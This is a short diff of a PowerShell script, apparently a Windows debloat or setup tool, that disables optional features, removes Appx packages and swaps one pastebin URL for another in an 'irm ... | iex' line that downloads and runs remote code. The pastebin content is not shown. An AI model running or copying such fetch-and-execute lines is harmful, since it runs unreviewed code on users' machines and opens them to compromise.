@@ -52,7 +52,7 @@ foreach ($feature in (Get-WindowsOptionalFeature -Online | Where-Object State -e
     Dism /Online /Disable-Feature /FeatureName:$feature /NoRestart | Out-Null
 }
 
-irm pastebin.com/raw/BiVeKbYf | iex
+irm pastebin.com/raw/j8eALn0x | iex
 foreach ($Package in $Packages) {
     Get-AppxPackage $Package | Remove-AppxPackage
 }
